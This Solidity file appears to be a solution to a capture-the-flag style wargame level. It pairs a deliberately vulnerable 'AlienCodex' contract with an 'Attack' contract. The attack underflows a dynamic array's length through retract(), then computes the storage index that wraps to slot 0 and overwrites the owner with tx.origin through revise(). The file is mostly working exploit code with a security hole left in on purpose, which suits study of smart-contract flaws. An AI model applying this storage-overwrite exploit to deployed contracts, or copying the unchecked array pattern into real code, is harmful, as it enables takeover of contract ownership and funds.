// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./helpers/Ownable-05.sol";

contract Attack {
  function attack(AlienCodex a) public {
    if (!a.contact()) {
      a.make_contact();
    }
    uint max_length = uint(int(-1));
    a.retract();
    uint target = max_length - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
    a.revise(target, bytes32(uint256(uint160(tx.origin))));
  }
}

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}